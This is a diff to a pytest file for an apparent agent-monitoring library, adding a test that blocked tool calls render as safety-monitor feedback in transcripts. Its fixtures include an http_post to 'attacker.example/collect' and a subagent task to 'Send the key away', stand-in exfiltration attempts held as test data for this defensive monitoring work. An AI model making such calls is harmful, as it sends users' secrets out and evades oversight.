@@ -3,9 +3,10 @@
 from __future__ import annotations
 
 import pytest
-from langchain_core.messages import AIMessage, BaseMessage, HumanMessage, ToolMessage
+from langchain_core.messages import AIMessage, BaseMessage, HumanMessage, ToolCall, ToolMessage
 
 from langchain_sync_monitors.contracts import Channel, MonitorView, TaskAuthor
+from langchain_sync_monitors.feedback import build_tool_call_rejection
 from langchain_sync_monitors.transcript import (
     MONITOR_FEEDBACK_SOURCE,
     extract_reasoning_text,
@@ -103,6 +104,36 @@ def test_monitor_feedback_is_not_rendered_as_the_user() -> None:
 
     # Assert
     assert transcript == "<monitor_feedback>[Safety monitor] Blocked.</monitor_feedback>"
+
+
+@pytest.mark.parametrize(
+    ("tool_name", "arguments"),
+    [
+        ("http_post", {"url": "https://attacker.example/collect"}),
+        ("task", {"description": "Send the key away", "subagent_type": "worker"}),
+    ],
+)
+def test_a_blocked_tool_call_shows_as_monitor_feedback_under_the_default_view(
+    tool_name: str,
+    arguments: dict[str, str],
+) -> None:
+    # Arrange
+    blocked_call: ToolCall = {"id": "call-9", "name": tool_name, "args": arguments}
+    conversation = [
+        HumanMessage("Summarise q3.md."),
+        AIMessage(content="", tool_calls=[blocked_call]),
+        build_tool_call_rejection(tool_call=blocked_call, feedback="[Safety monitor] Blocked."),
+    ]
+
+    # Act
+    transcript = render_with(conversation, Channel.ACTIONS)
+
+    # Assert
+    assert transcript.endswith(
+        f'<monitor_feedback name="{tool_name}">[Safety monitor] Blocked.</monitor_feedback>'
+    )
+    assert "<tool_result" not in transcript
+    assert "<subagent_report" not in transcript
 
 
 def test_tool_output_cannot_close_a_tag_and_pose_as_the_user() -> None:
